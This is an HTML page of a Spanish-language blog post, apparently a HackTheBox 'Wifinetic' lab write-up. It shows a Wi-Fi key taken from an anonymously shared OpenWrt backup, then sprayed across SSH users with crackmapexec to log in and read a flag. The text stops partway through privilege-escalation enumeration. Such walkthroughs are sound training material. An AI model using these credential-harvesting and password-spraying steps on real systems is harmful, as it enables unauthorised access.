<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Wifinetic (easy) | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="HackTheBox - Wifinetic (easy)" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/06/05/wifinetic.html" />
<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/06/05/wifinetic.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-06-05T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox - Wifinetic (easy)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-06-05T00:00:00-06:00","datePublished":"2024-06-05T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Wifinetic (easy)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/06/05/wifinetic.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/06/05/wifinetic.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Wifinetic (easy)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-06-05T00:00:00-06:00" itemprop="datePublished">
        Jun 5, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/4aaf2ad33bea830079d74497f8e7fefc.png" />
</p>

<ul>
  <li>Wifinetic is an easy difficulty Linux machine which presents an intriguing network challenge, focusing on wireless security and network monitoring. An exposed FTP service has anonymous authentication enabled which allows us to download available files. One of the file being an OpenWRT backup which contains Wireless Network configuration that discloses an Access Point password. The contents of shadow or passwd files further disclose usernames on the server. With this information, a password reuse attack can be carried out on the SSH service, allowing us to gain a foothold as the netadmin user. Using standard tools and with the provided wireless interface in monitoring mode, we can brute force the WPS PIN for the Access Point to obtain the pre-shared key ( PSK ). The pass phrase can be reused on SSH service to obtain root access on the server.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos haciendo un escaneo de puertos abiertos y sus servicios por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,53 10.10.11.247 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-05 12:21 CST
Nmap scan report <span class="k">for </span>10.10.11.247
Host is up <span class="o">(</span>0.084s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
| <span class="nt">-rw-r--r--</span>    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
| <span class="nt">-rw-r--r--</span>    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
| <span class="nt">-rw-r--r--</span>    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
| <span class="nt">-rw-r--r--</span>    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Si analizamos el escaneo vemos que tenemos puerto el puerto <strong>21</strong> que corresponde al servicio <strong>FTP</strong> el cual podemos conectarnos usando un <code class="language-plaintext highlighter-rouge">Anonymous FTP login</code> ya que esta habilitado además de que nos comparten archivos <code class="language-plaintext highlighter-rouge">pdf, tar y txt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ftp 10.10.11.247
Connected to 10.10.11.247.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.11.247:miguel<span class="o">)</span>: anonymous
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">dir
</span>229 Entering Extended Passive Mode <span class="o">(||</span>|40843|<span class="o">)</span>
150 Here comes the directory listing.
<span class="nt">-rw-r--r--</span>    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
<span class="nt">-rw-r--r--</span>    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
<span class="nt">-rw-r--r--</span>    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
<span class="nt">-rw-r--r--</span>    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
<span class="nt">-rw-r--r--</span>    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
226 Directory send OK.
</code></pre></div></div>

<ul>
  <li>Vamos a descargarnos todo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; prompt off
Interactive mode off.
ftp&gt; mget <span class="k">*</span>
<span class="nb">local</span>: MigrateOpenWrt.txt remote: MigrateOpenWrt.txt
229 Entering Extended Passive Mode <span class="o">(||</span>|47292|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>MigrateOpenWrt.txt <span class="o">(</span>4434 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>|  4434       25.02 MiB/s    00:00 ETA
226 Transfer complete.
4434 bytes received <span class="k">in </span>00:00 <span class="o">(</span>48.57 KiB/s<span class="o">)</span>
<span class="nb">local</span>: ProjectGreatMigration.pdf remote: ProjectGreatMigration.pdf
229 Entering Extended Passive Mode <span class="o">(||</span>|47722|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>ProjectGreatMigration.pdf <span class="o">(</span>2501210 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>|  2442 KiB  649.31 KiB/s    00:00 ETA
226 Transfer complete.
2501210 bytes received <span class="k">in </span>00:03 <span class="o">(</span>634.83 KiB/s<span class="o">)</span>
<span class="nb">local</span>: ProjectOpenWRT.pdf remote: ProjectOpenWRT.pdf
229 Entering Extended Passive Mode <span class="o">(||</span>|49450|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>ProjectOpenWRT.pdf <span class="o">(</span>60857 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>| 60857      322.21 KiB/s    00:00 ETA
226 Transfer complete.
60857 bytes received <span class="k">in </span>00:00 <span class="o">(</span>214.25 KiB/s<span class="o">)</span>
<span class="nb">local</span>: backup-OpenWrt-2023-07-26.tar remote: backup-OpenWrt-2023-07-26.tar
229 Entering Extended Passive Mode <span class="o">(||</span>|47415|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>backup-OpenWrt-2023-07-26.tar <span class="o">(</span>40960 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>| 40960      368.09 KiB/s    00:00 ETA
226 Transfer complete.
40960 bytes received <span class="k">in </span>00:00 <span class="o">(</span>205.82 KiB/s<span class="o">)</span>
<span class="nb">local</span>: employees_wellness.pdf remote: employees_wellness.pdf
229 Entering Extended Passive Mode <span class="o">(||</span>|49749|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>employees_wellness.pdf <span class="o">(</span>52946 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>| 52946      300.96 KiB/s    00:00 ETA
226 Transfer complete.
52946 bytes received <span class="k">in </span>00:00 <span class="o">(</span>200.50 KiB/s<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>En el <strong>.txt</strong> nos hablan sobre <code class="language-plaintext highlighter-rouge">OpenWRT</code> <a href="https://www.redeszone.net/tutoriales/redes-cable/openwrt-utilidades-router/">https://www.redeszone.net/tutoriales/redes-cable/openwrt-utilidades-router/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>MigrateOpenWrt.txt
  +-------------------------------------------------------+
  |             Replace OpenWRT with Debian                |
  +-------------------------------------------------------+
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |        Evaluate Current OpenWRT Setup        |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Plan and Prepare the Migration       |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Inventory current hardware and software   |    |
  |  |   - Identify dependencies and customizations  |    |
  |  |   - Research Debian-compatible alternatives   |    |
  |  |   - Backup critical configurations and data   |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |            Install Debian on Devices         |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Obtain latest Debian release              |    |
  |  |   - Check hardware compatibility              |    |
  |  |   - Flash/install Debian on each device       |    |
  |  |   - Verify successful installations           |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Set Up Networking and Services       |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Configure network interfaces              |    |
  |  |   - Install and configure Wifi drivers        |    |
  |  |   - Set up DHCP, DNS, and routing             |    |
  |  |   - Install firewall and security measures    |    |
  |  |   - Set up any additional services needed     |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |           Migrate Configurations             |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Adapt OpenWRT configurations to Debian    |    |
  |  |   - Migrate custom settings and scripts       |    |
  |  |   - Ensure compatibility with new system      |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |          Test and Troubleshoot               |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Test Wifi connectivity and performance    |    |
  |  |   - Verify all services are functioning       |    |
  |  |   - Address and resolve any issues            |    |
  |  |   - Test <span class="k">for </span>security issues with Reaver tool |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Monitor and Maintain                 |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Implement regular updates and patches     |    |
  |  |   - Monitor system health and performance     |    |
  |  |   - Maintain and optimize the Debian system   |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  +-------------------------------------------------------+
</code></pre></div></div>

<ul>
  <li>Si analizamos los <code class="language-plaintext highlighter-rouge">PDFs</code> encontramos información.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/1.png" />
</p>

<ul>
  <li>Aquí hablan solo de un proyecto que tienen.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/2.png" />
</p>

<ul>
  <li>Aquí nos hablan sobre la migración de <code class="language-plaintext highlighter-rouge">OpenWRT</code> para su red wifi y el <code class="language-plaintext highlighter-rouge">pdf</code> es del administrador de la red Oliver Walker.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/3.png" />
</p>

<ul>
  <li>Pues bueno no encontramos nada interesante vamos analizar el <code class="language-plaintext highlighter-rouge">backup-OpenWrt-2023-07-26.tar</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap 7z x backup-OpenWrt-2023-07-26.tar

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 40960 bytes <span class="o">(</span>40 KiB<span class="o">)</span>

Extracting archive: backup-OpenWrt-2023-07-26.tar
<span class="nt">--</span>
Path <span class="o">=</span> backup-OpenWrt-2023-07-26.tar
Type <span class="o">=</span> <span class="nb">tar
</span>Physical Size <span class="o">=</span> 40960
Headers Size <span class="o">=</span> 19968
Code Page <span class="o">=</span> UTF-8
Characteristics <span class="o">=</span> GNU ASCII

Everything is Ok

Folders: 7
Files: 27
Size:       13804
Compressed: 40960
</code></pre></div></div>

<ul>
  <li>Dentro del directorio <code class="language-plaintext highlighter-rouge">/etc</code> nos comparten muchos archivos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  etc tree
<span class="nb">.</span>
├── config
│   ├── dhcp
│   ├── dropbear
│   ├── firewall
│   ├── luci
│   ├── network
│   ├── rpcd
│   ├── system
│   ├── ucitrack
│   ├── uhttpd
│   └── wireless
├── dropbear
│   ├── dropbear_ed25519_host_key
│   └── dropbear_rsa_host_key
├── group
├── hosts
├── inittab
├── luci-uploads
├── nftables.d
│   ├── 10-custom-filter-chains.nft
│   └── README
├── opkg
│   └── keys
│       └── 4d017e6f1ed5d616
├── passwd
├── profile
├── rc.local
├── shells
├── shinit
├── sysctl.conf
├── uhttpd.crt
└── uhttpd.key

7 directories, 26 files
</code></pre></div></div>

<ul>
  <li>En <code class="language-plaintext highlighter-rouge">wireless</code> encontramos una <code class="language-plaintext highlighter-rouge">key</code> para al parecer un <code class="language-plaintext highlighter-rouge">AP</code> con nombre <code class="language-plaintext highlighter-rouge">wifinet1, wifinet0</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  config <span class="nb">cat </span>wireless

config wifi-device <span class="s1">'radio0'</span>
	option <span class="nb">type</span> <span class="s1">'mac80211'</span>
	option path <span class="s1">'virtual/mac80211_hwsim/hwsim0'</span>
	option cell_density <span class="s1">'0'</span>
	option channel <span class="s1">'auto'</span>
	option band <span class="s1">'2g'</span>
	option txpower <span class="s1">'20'</span>

config wifi-device <span class="s1">'radio1'</span>
	option <span class="nb">type</span> <span class="s1">'mac80211'</span>
	option path <span class="s1">'virtual/mac80211_hwsim/hwsim1'</span>
	option channel <span class="s1">'36'</span>
	option band <span class="s1">'5g'</span>
	option htmode <span class="s1">'HE80'</span>
	option cell_density <span class="s1">'0'</span>

config wifi-iface <span class="s1">'wifinet0'</span>
	option device <span class="s1">'radio0'</span>
	option mode <span class="s1">'ap'</span>
	option ssid <span class="s1">'OpenWrt'</span>
	option encryption <span class="s1">'psk'</span>
	option key <span class="s1">'VeRyUniUqWiFIPasswrd1!'</span>
	option wps_pushbutton <span class="s1">'1'</span>

config wifi-iface <span class="s1">'wifinet1'</span>
	option device <span class="s1">'radio1'</span>
	option mode <span class="s1">'sta'</span>
	option network <span class="s1">'wwan'</span>
	option ssid <span class="s1">'OpenWrt'</span>
	option encryption <span class="s1">'psk'</span>
	option key <span class="s1">'VeRyUniUqWiFIPasswrd1!'</span>
</code></pre></div></div>

<ul>
  <li>Aquí encontramos usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  etc <span class="nb">cat </span>group
root:x:0:
daemon:x:1:
adm:x:4:
mail:x:8:
dialout:x:20:
audio:x:29:
www-data:x:33:
ftp:x:55:
<span class="nb">users</span>:x:100:
network:x:101:network
nogroup:x:65534:
ntp:x:123:ntp
dnsmasq:x:453:dnsmasq
logd:x:514:logd
ubus:x:81:ubus
netadmin:!:999:
</code></pre></div></div>

<ul>
  <li>Como tenemos una contraseña y nombres de varios usuarios hice una lista y con <code class="language-plaintext highlighter-rouge">crackmapexec</code> vi que usuarios usan la contraseña para autenticarse por <code class="language-plaintext highlighter-rouge">ssh</code> y el usuario <code class="language-plaintext highlighter-rouge">netadmin</code> la usa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>users.txt
root
adm
mail
network
ntp
netadmin
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme ssh 10.10.11.247 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'VeRyUniUqWiFIPasswrd1!'</span> <span class="nt">--continue-on-success</span>
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span><span class="k">*</span><span class="o">]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] root:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] adm:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] mail:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] network:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] ntp:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>+] netadmin:VeRyUniUqWiFIPasswrd1!
</code></pre></div></div>

<h2 id="shell-as-netadmin-and-usertxt">Shell as netadmin and user.txt</h2>

<ul>
  <li>Ahora nos podemos conectar y ver la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ssh netadmin@10.10.11.247
The authenticity of host <span class="s1">'10.10.11.247 (10.10.11.247)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.11.247<span class="s1">' (ED25519) to the list of known hosts.
netadmin@10.10.11.247'</span>s password:
Welcome to Ubuntu 20.04.6 LTS <span class="o">(</span>GNU/Linux 5.4.0-162-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Wed 05 Jun 2024 06:45:43 PM UTC

  System load:            0.04
  Usage of /:             70.1% of 4.76GB
  Memory usage:           12%
  Swap usage:             0%
  Processes:              228
  Users logged <span class="k">in</span>:        0
  IPv4 address <span class="k">for </span>eth0:  10.10.11.247
  IPv6 address <span class="k">for </span>eth0:  dead:beef::250:56ff:feb9:e70f
  IPv4 address <span class="k">for </span>wlan0: 192.168.1.1
  IPv4 address <span class="k">for </span>wlan1: 192.168.1.23


Expanded Security Maintenance <span class="k">for </span>Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: <span class="nb">sudo </span>pro status


The list of available updates is more than a week old.
To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jun  5 04:48:37 2024 from 10.10.16.6
netadmin@wifinetic:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
netadmin@wifinetic:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
c1b267d58451fd704217588ece6ae83b
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>No vemos nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/snapd/snap-confine
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/bin/mount
./usr/bin/sudo
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/passwd
./usr/bin/fusermount
./usr/bin/chsh
./usr/bin/at
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/su
</code></pre></div></div>

<ul>
  <li>No tenemos ningún privilegio a nivel de <code class="language-plaintext highlighter-rouge">sudoers</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>netadmin:
Sorry, user netadmin may not run <span class="nb">sudo </span>on wifinetic.
</code></pre></div></div>

<ul>
  <li>Podemos buscar por <code class="language-plaintext highlighter-rouge">capabilities</code> <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</a> la herramienta <code class="language-plaintext highlighter-rouge">reaver</code> <a href="https://www.kali.org/tools/reaver/">https://www.kali.org/tools/reaver/</a> <a href="https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html">https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html</a> es utilizada para ataques wifi WPS.</li>
</ul>

<blockquote>
  <p>El protocolo WPS (Wi-Fi Protected Setup) es un estándar de seguridad de redes diseñado para facilitar la configuración segura de una red inalámbrica Wi-Fi. Este protocolo permite a los usuarios conectar dispositivos a una red inalámbrica de forma segura y conveniente sin tener que ingresar una contraseña larga.</p>
</blockquote>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/4.png" />
</p>

<ul>
  <li>Tenemos 6 interfaces.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>ifconfig
eth0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:e70f  prefixlen 64  scopeid 0x0&lt;global&gt;
        inet6 fe80::250:56ff:feb9:e70f  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 00:50:56:b9:e7:0f  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 234991  bytes 14972570 <span class="o">(</span>14.9 MB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 213051  bytes 19724677 <span class="o">(</span>19.7 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  <span class="o">(</span>Local Loopback<span class="o">)</span>
        RX packets 148254  bytes 9637744 <span class="o">(</span>9.6 MB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 148254  bytes 9637744 <span class="o">(</span>9.6 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  <span class="o">(</span>UNSPEC<span class="o">)</span>
        RX packets 598684  bytes 105544453 <span class="o">(</span>105.5 MB<span class="o">)</span>
        RX errors 0  dropped 598623  overruns 0  frame 0
        TX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 02:00:00:00:00:00  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 20246  bytes 1987658 <span class="o">(</span>1.9 MB<span class="o">)</span>
        RX errors 0  dropped 2743  overruns 0  frame 0
        TX packets 23375  bytes 2791153 <span class="o">(</span>2.7 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 02:00:00:00:01:00  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 5862  bytes 815386 <span class="o">(</span>815.3 KB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20223  bytes 2348428 <span class="o">(</span>2.3 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: <span class="nv">flags</span><span class="o">=</span>4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre></div></div>

<ul>
  <li>
    <p>La que mas llama la atención es <code class="language-plaintext highlighter-rouge">mon0</code> ya que cuando tenemos una antena y la ponemos en modo monitor suele llamarse <code class="language-plaintext highlighter-rouge">wlan0mon</code>.</p>
  </li>
  <li>
    <p>Algo que podemos hacer es ver mas información acerca de las interfaces inalámbricas en el sistema.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>iw dev
phy#2
	Interface mon0
		ifindex 7
		wdev 0x200000002
		addr 02:00:00:00:02:00
		<span class="nb">type </span>monitor
		txpower 20.00 dBm
	Interface wlan2
		ifindex 5
		wdev 0x200000001
		addr 02:00:00:00:02:00
		<span class="nb">type </span>managed
		txpower 20.00 dBm
phy#1
	Unnamed/non-netdev interface
		wdev 0x10000056b
